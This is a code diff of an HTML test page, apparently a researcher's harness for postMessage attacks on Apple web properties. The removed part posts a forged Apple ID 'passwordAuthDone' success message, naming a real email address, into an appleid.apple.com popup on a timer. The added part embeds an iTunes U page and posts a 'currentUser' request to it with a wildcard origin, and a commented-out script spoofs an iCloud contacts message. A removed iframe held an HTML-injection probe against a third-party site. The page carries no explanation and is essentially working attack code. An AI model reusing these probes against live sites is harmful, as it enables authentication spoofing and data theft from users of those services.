@@ -6,7 +6,7 @@
   <script>
   function listener(event) {
     document.getElementById("message").innerHTML = event.data;
-    console.log(event.data);
+    // console.log(event.data);
     // alert(event.origin);
   }
   if (window.addEventListener) {
@@ -14,15 +14,21 @@
   } else {
     attachEvent("onmessage", listener);
   }
-  </script> -->
-  <script>
-  var popup = window.open('https://appleid.apple.com/#!&page=signin');
-  function post(){popup.postMessage('pmrpc.{"jsonrpc":"2.0","method":"passwordAuthDone","params":[true,{"isAuthSuccess":true,"session":null,"accountType":"SA","accountName":"balapdotid@gmail.com","isOnDemand2FA":true,"accountCountry":"IDN"}],"id":"4B3EEC96-A549-462B-9188-36AED356D388"}', "*")}
-  setInterval(post,10000);
-  // setInterval(post,1000);
   </script>
+  <!-- <script>
+  var popup = window.open('https://vpp-app.itunes.apple.com/');
+  function post(){popup.postMessage('{"isCloudOSMessage":true,"methodName":"requestReceived","appName":"calendar","buildNumber":"2009Project31","masteringNumber":"2009B27","args":[{"httpMethod":"GET","statusCode":200,"serverHostname":"p52-contactsws.icloud.com","urlPath":"/co/addressbook/","clientTiming":1708,"uncompressedResponseSize":69654,"serviceName":"contacts"},200,"https://p52-contactsws.icloud.com:443/co/addressbook/?clientBuildNumber=2009Project31&clientId=9f874237-a2fc-4ab9-9537-f6d026e4ef20&clientMasteringNumber=2009B27&dsid=11792256178&includePhoneNumbers=true&locale=en_US&order=last%2Cfirst",null]}', "*")}
+  setInterval(post,5000);
+  // setInterval(post,1000);
+  </script> -->
 <body>
   <div id="message"></div>
-  <!-- <iframe src="https://kredivo.com/referral.html?referrer=%3Cimg%20src=x%3E"></iframe> -->
+  <div id="z"></div>
+  <iframe id=x src="https://itunesu.itunes.apple.com/coursemanager/" width="1000px" height="1000px"></iframe>
 </body>
+<script>
+var x = document.getElementById("x").contentWindow;
+x.postMessage("currentUser","*");
+// var message = document.getElementById("z").innerHTML = x;
+</script>
 </html>
